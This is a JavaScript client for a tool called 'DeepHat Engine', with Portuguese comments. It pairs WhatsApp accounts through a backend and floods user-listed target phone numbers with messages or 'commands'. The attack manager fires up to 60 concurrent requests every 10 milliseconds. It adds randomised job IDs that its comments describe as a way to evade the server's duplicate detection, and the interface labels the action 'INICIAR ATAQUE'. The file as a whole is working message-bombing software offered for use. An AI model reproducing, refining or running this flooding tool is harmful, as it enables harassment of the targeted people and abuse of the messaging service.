/* 
===========================================================
DEEPHAT ENGINE - CORE & API (BLOCO 1/5)
===========================================================
*/

window.DeepHat = window.DeepHat || {};
window.DeepHat.EngineState = {
    isAttacking: false,
    selectedCommand: null,
    targets: [],
    stats: { sent: 0, success: 0, failed: 0 },
    activeRequests: 0,
    usage: 0,
    limit: 1500
};

// CONFIGURAÇÃO DE POTÊNCIA MÁXIMA (NÍVEL HACK)
const CONFIG = {
    ATTACK_INTERVAL: 10,    // 10ms entre disparos (Velocidade máxima)
    MAX_CONCURRENCY: 60,    // Até 60 requisições simultâneas para estressar a API
    RETRY_DELAY: 500        // Tempo de espera em caso de erro de rede
};

const ApiManager = (() => {
    async function request(url, options = {}) {
        try {
            const res = await fetch(url, {
                method: options.method || 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'X-DeepHat-Version': '1.1',
                    ...options.headers
                },
                body: options.body ? JSON.stringify(options.body) : undefined
            });

            const data = await res.json().catch(() => ({}));
            if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
            return data;
        } catch (err) {
            console.error(`[API ERROR] ${err.message}`);
            throw err;
        }
    }
    return { request };
})();
window.ApiManager = ApiManager;
/* 
===========================================================
DEEPHAT ENGINE - ATTACK MANAGER (BLOCO 2/5)
===========================================================
*/

const AttackManager = (() => {
    const start = async (targets, command) => {
        if (window.DeepHat.EngineState.isAttacking) return;
        
        window.DeepHat.EngineState.isAttacking = true;
        window.DeepHat.EngineState.targets = targets;
        window.DeepHat.EngineState.selectedCommand = command;
        window.DeepHat.EngineState.stats = { sent: 0, success: 0, failed: 0 };
        window.DeepHat.EngineState.activeRequests = 0;
        
        processQueue();
    };

    const processQueue = async () => {
        if (!window.DeepHat.EngineState.isAttacking || window.DeepHat.EngineState.targets.length === 0) {
            stop();
            return;
        }

        // Flood: Dispara múltiplas requisições simultâneas até o limite de concorrência
        while (window.DeepHat.EngineState.isAttacking && window.DeepHat.EngineState.activeRequests < CONFIG.MAX_CONCURRENCY) {
            const target = window.DeepHat.EngineState.targets[window.DeepHat.EngineState.stats.sent % window.DeepHat.EngineState.targets.length];
            executeAttack(target);
            window.DeepHat.EngineState.stats.sent++;
            window.DeepHat.EngineState.activeRequests++;
        }

        // Usa requestAnimationFrame para não travar a aba do navegador durante o flood
        requestAnimationFrame(() => {
            if (window.DeepHat.EngineState.isAttacking) {
                setTimeout(processQueue, CONFIG.ATTACK_INTERVAL);
            }
        });
    };

    const executeAttack = async (target) => {
        try {
            // Payload otimizado para evitar detecção de duplicidade simples no servidor
            await ApiManager.request('/api/whatsapp/send', {
                method: 'POST',
                body: { 
                    target: target, 
                    command: window.DeepHat.EngineState.selectedCommand,
                    job_id: `job-${Date.now()}-${Math.floor(Math.random() * 10000)}`
                }
            });
            window.DeepHat.EngineState.stats.success++;
        } catch (err) {
            window.DeepHat.EngineState.stats.failed++;
        } finally {
            window.DeepHat.EngineState.activeRequests--;
            // Atualiza a UI em tempo real se a função de callback existir
            if (window.onUpdateStats) window.onUpdateStats(window.DeepHat.EngineState.stats);
        }
    };

    const stop = () => {
        window.DeepHat.EngineState.isAttacking = false;
        window.DeepHat.EngineState.activeRequests = 0;
    };

    return { 
        start, 
        stop, 
        getIsAttacking: () => window.DeepHat.EngineState.isAttacking 
    };
})();

window.AttackManager = AttackManager;
/* 
===========================================================
DEEPHAT ENGINE - UI MANAGER (BLOCO 3/5)
===========================================================
*/

const UIManager = (() => {
    const elements = {
        sendButton: document.getElementById('sendButton'),
        targetInput: document.getElementById('target'),
        commandsButton: document.getElementById('commandsButton'),
        commandsPanel: document.getElementById('commandsPanel'),
        closeCommands: document.getElementById('closeCommands'),
        commandOptions: document.querySelectorAll('.command-option-v30'),
        selectedCommandDisplay: document.getElementById('selectedCommandDisplay'),
        statusLine: document.getElementById('sendStatusLine'),
        statusDetail: document.getElementById('sendStatusDetail'),
        progressBar: document.getElementById('sendProgressBar'),
        actionNotice: document.getElementById('actionNotice'),
        navLinks: document.querySelectorAll('.bottom-nav-v22 a'),
        tabPanels: document.querySelectorAll('.user-tab-panel'),
        usageText: document.getElementById('sendUsageText'),
        connectBtn: document.getElementById('connectWhatsApp')
    };

    const updateUIStatus = (stats) => {
        if (elements.statusLine) {
            elements.statusLine.textContent = stats.sent > 0 ? '⚡ EM OPERAÇÃO...' : 'Aguardando...';
            elements.statusLine.style.color = '#ff304b';
        }
        if (elements.statusDetail) {
            elements.statusDetail.textContent = `Enviados: ${stats.sent} | Sucesso: ${stats.success} | Falhas: ${stats.failed}`;
        }
        if (elements.progressBar) {
            const progress = Math.min((stats.sent / 500) * 100, 100);
            elements.progressBar.style.width = `${progress}%`;
        }
    };

    const showNotice = (msg, type = 'info') => {
        if (!elements.actionNotice) return;
        elements.actionNotice.textContent = msg;
        elements.actionNotice.classList.remove('hidden');
        elements.actionNotice.style.color = type === 'error' ? '#ff304b' : '#14d7ff';
        setTimeout(() => { elements.actionNotice.classList.add('hidden'); }, 3000);
    };

    const setupAttackButton = () => {
        if (!elements.sendButton) return;
        elements.sendButton.addEventListener('click', async () => {
            if (window.AttackManager.getIsAttacking()) {
                window.AttackManager.stop();
                elements.sendButton.textContent = '🚀 INICIAR ATAQUE';
                elements.sendButton.classList.replace('danger', 'primary');
                return;
            }

            const targetsRaw = elements.targetInput.value.trim();
            const command = window.DeepHat.EngineState.selectedCommand;

            if (!targetsRaw || !command) {
                return showNotice("Configure o alvo e o comando!", "error");
            }

            const targets = targetsRaw.split(/[\n,;\s]+/).filter(t => t.length > 5);
            
            elements.sendButton.disabled = true;
            elements.sendButton.textContent = '⏳ PROCESSANDO...';
            
            await window.AttackManager.start(targets, command);
            
            elements.sendButton.disabled = false;
            elements.sendButton.textContent = '⏹ PARAR ATAQUE';
            elements.sendButton.classList.replace('primary', 'danger');
        });
    };

    const setupCommands = () => {
        elements.commandsButton?.addEventListener('click', () => elements.commandsPanel?.classList.toggle('hidden'));
        elements.closeCommands?.addEventListener('click', () => elements.commandsPanel?.classList.add('hidden'));
        
        elements.commandOptions.forEach(opt => {
            opt.addEventListener('click', () => {
                elements.commandOptions.forEach(o => o.classList.remove('selected'));
                opt.classList.add('selected');
                
                const command = opt.getAttribute('data-command');
                window.DeepHat.EngineState.selectedCommand = command;
                
                if (elements.selectedCommandDisplay) {
                    elements.selectedCommandDisplay.textContent = `Modo: ${opt.innerText}`;
                }
                showNotice('Comando configurado!', 'success');
            });
        });
    };

    const setupNavigation = () => {
        elements.navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const tabName = link.getAttribute('data-tab');
                
                elements.tabPanels.forEach(panel => { 
                    panel.classList.remove('active-tab'); 
                    panel.classList.add('hidden'); 
                });
                
                const targetTab = document.getElementById(`tab-${tabName}`);
                if (targetTab) { 
                    targetTab.classList.remove('hidden'); 
                    targetTab.classList.add('active-tab'); 
                }
                
                elements.navLinks.forEach(nav => nav.classList.remove('active'));
                link.classList.add('active');
            });
        });
    };

    const setupHome = () => {
        elements.connectBtn?.addEventListener('click', () => {
            document.getElementById('connectModal')?.classList.remove('hidden');
        });
    };

    return {
        init: () => {
            setupAttackButton();
            setupCommands();
            setupNavigation();
            setupHome();
        },
        updateStatus: updateUIStatus,
        showNotice,
        updateUsage: (val, limit) => {
            if (elements.usageText) elements.usageText.textContent = `${val} / ${limit}`;
        }
    };
})();

window.UIManager = UIManager;
/* 
===========================================================
DEEPHAT ENGINE - INTEGRATION MANAGER (BLOCO 4/5)
===========================================================
*/

const IntegrationManager = (() => {
    const setupConnection = async () => {
        const connectForm = document.getElementById('connectForm');
        const pairingBox = document.getElementById('pairingBox');
        const pairingCodeEl = document.getElementById('pairingCode');
        const connectStateEl = document.getElementById('connectState');
        const closeModal = document.getElementById('closeModal');
        const cancelConnect = document.getElementById('cancelConnect');
        const saveBtn = document.getElementById('saveConnect');

        if (!connectForm) return;

        const resetConnectForm = () => {
            if (saveBtn) {
                saveBtn.disabled = false;
                saveBtn.textContent = "Conectar";
            }
            if (connectStateEl) {
                connectStateEl.classList.remove('hidden');
                connectStateEl.textContent = "Aguardando número...";
            }
            if (pairingBox) pairingBox.classList.add('hidden');
        };

        closeModal?.addEventListener('click', () => {
            document.getElementById('connectModal')?.classList.add('hidden');
            resetConnectForm();
        });

        cancelConnect?.addEventListener('click', () => {
            document.getElementById('connectModal')?.classList.add('hidden');
            resetConnectForm();
        });

        connectForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('pairingPhone').value.trim();
            if (!phone) return window.UIManager.showNotice("Digite um número!", "error");

            if (saveBtn) {
                saveBtn.disabled = true;
                saveBtn.textContent = "SOLICITANDO...";
            }
            if (connectStateEl) connectStateEl.textContent = "Conectando ao servidor...";

            try {
                const data = await ApiManager.request('/api/whatsapp/connect', {
                    method: 'POST',
                    body: { phone: phone }
                });

                if (data && data.code) {
                    if (connectStateEl) connectStateEl.classList.add('hidden');
                    if (pairingBox) pairingBox.classList.remove('hidden');
                    if (pairingCodeEl) {
                        pairingCodeEl.textContent = data.code;
                        pairingCodeEl.style.color = "#14d7ff";
                    }
                    if (saveBtn) saveBtn.textContent = "CÓDIGO GERADO";
                }
            } catch (err) {
                console.error("[CONN ERROR]", err);
                window.UIManager.showNotice(err.message || "Erro ao conectar!", "error");
                resetConnectForm();
            }
        });
    };

    const syncStatus = async () => {
        try {
            const numbers = await ApiManager.request('/api/whatsapp/numbers');
            const listContainer = document.getElementById('connectedList');
            const authList = document.getElementById('authorizedList');

            const renderList = (container, data) => {
                if (!container) return;
                container.innerHTML = '';
                if (!data || data.length === 0) {
                    container.innerHTML = '<div class="text-center" style="color:#78a9bc; margin-top:15px; padding:20px; border:1px dashed #0a7fac; border-radius:8px;">Nenhuma sessão ativa.</div>';
                    return;
                }
                data.forEach(num => {
                    const div = document.createElement('div');
                    div.className = 'num-item';
                    div.innerHTML = `
                        <div style="font-size:20px;">📱</div>
                        <div>
                            <strong style="color:#14d7ff;">${num.label || 'Sessão Ativa'}</strong><br>
                            <small style="color:#78a9bc;">${num.display_phone_number || num.pairing_phone || 'Conectado'}</small>
                        </div>`;
                    container.appendChild(div);
                });
            };

            renderList(listContainer, numbers);
            renderList(authList, numbers);

            const countEl = document.getElementById('authorizedCount');
            if (countEl) countEl.textContent = numbers ? numbers.length : 0;
        } catch (err) { 
            console.warn("[SYNC] Offline ou sem sessões."); 
        }
    };

    return {
        init: async () => {
            await setupConnection();
            await syncStatus();
        },
        refresh: syncStatus
    };
})();

window.IntegrationManager = IntegrationManager;
/* 
===========================================================
DEEPHAT ENGINE - BOOT SYSTEM (BLOCO 5/5)
===========================================================
*/

const bootSystem = async () => {
    console.log('%c ⚡ DEEPHAT ENGINE: INICIANDO...', 'color: #00ff88; font-weight: bold; font-size: 16px;');
    
    try {
        // Inicializa a Interface
        if (window.UIManager) {
            UIManager.init();
        }

        // Inicializa a Integração e Pareamento
        if (window.IntegrationManager) {
            await IntegrationManager.init();
        }

        // Define o callback de atualização de estatísticas para a UI
        window.onUpdateStats = (stats) => {
            if (window.UIManager) {
                window.UIManager.updateStatus(stats);
            }
        };

        // Sincroniza Configurações de Uso e Limites
            // Sincroniza Configurações de Uso e Limites (Opcional)
            try {
                const [cfg, usage] = await Promise.all([
                    ApiManager.request('/api/user-send-config').catch(() => ({ limit: 1500 })),
                    ApiManager.request('/api/whatsapp/usage').catch(() => ({ sent_count: 0 }))
                ]);
                
                window.DeepHat.EngineState.limit = cfg.limit || 1500;
                window.DeepHat.EngineState.usage = usage.sent_count || 0;
                
                if (window.UIManager) {
                    window.UIManager.updateUsage(window.DeepHat.EngineState.usage, window.DeepHat.EngineState.limit);
                }
            } catch (e) {
                console.log("[BOOT] Usando limites padrão de sistema.");
            }

        // Configura Botão de Logout
        const logoutBtn = document.getElementById('logout');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', async () => {
                if (confirm('Deseja realmente encerrar a sessão?')) {
                    try { 
                        await ApiManager.request('/api/logout', { method: 'POST' }); 
                    } catch (e) { 
                        console.error("Erro ao deslogar"); 
                    }
                    location.href = '/login.html';
                }
            });
        }

        console.log('%c ✅ SISTEMA ONLINE E OPERACIONAL', 'color: #00ff88; font-size: 14px; font-weight: bold;');
    } catch (err) {
        console.error('[CRITICAL BOOT ERROR]', err);
    }
};

// Execução segura dependendo do estado do DOM
if (document.readyState === 'complete') { 
    bootSystem(); 
} else { 
    window.addEventListener('load', bootSystem); 
}

// Auto-refresh de sessões a cada 45 segundos para manter a lista atualizada
setInterval(() => { 
    if (window.IntegrationManager?.refresh) {
        window.IntegrationManager.refresh(); 
    }
}, 45000);
